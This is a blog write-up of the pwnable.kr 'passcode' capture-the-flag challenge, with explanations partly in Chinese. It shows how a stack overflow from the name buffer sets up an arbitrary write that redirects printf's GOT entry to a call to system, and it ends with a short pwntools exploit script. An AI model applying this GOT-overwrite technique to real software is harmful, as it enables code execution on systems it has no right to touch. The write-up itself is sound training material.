---
layout:     post
title:      pwnable passcode
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>http://pwnable.kr/  
>  
>Problem Description:  
>Mommy told me to make a passcode based login system.  
>My initial C code was compiled without any error!  
>Well, there was some compiler warning, but who cares about that?  
>  
>Address:  
>ssh passcode@pwnable.kr -p2222 (pw:guest)  
<!-- more -->


### 0x00 disassembly

if passcode1 = 338150 & passcode2 = 13371337, getshell～

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x00.png)

开了GS

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x01.png)

考虑到 welcome、login 的ebp相同, 利用 welcome 的name来溢出

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x02.png)

查看 name、passcode1、passcode2 在栈中的位置

```
$ objdump -d ./passcode
```

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x03.png)
![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x04.png)

name 距离 passcode1 0x70 - 0x10 = 0x60 bytes, 溢出完由于GS造成崩溃, 不能利用login来getshell

```
$ objdump -R ./passcode
```

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x05.png)

现在可以实现任意写, 将 printf@got 改写成 call system 处的地址

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x06.png)


### 0x01 exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

printf_addr = 0x0804a000
system_addr = 134514147

Io = process('./passcode')
payload = 'A'*0x60 + p32(printf_addr) + '\n' + str(system_addr) + '\n'
Io.send(payload)
Io.recv()
```

getflag~

![](/assets/img/writeup/pwn/2017-08-26-pwnable-passcode/0x07.png)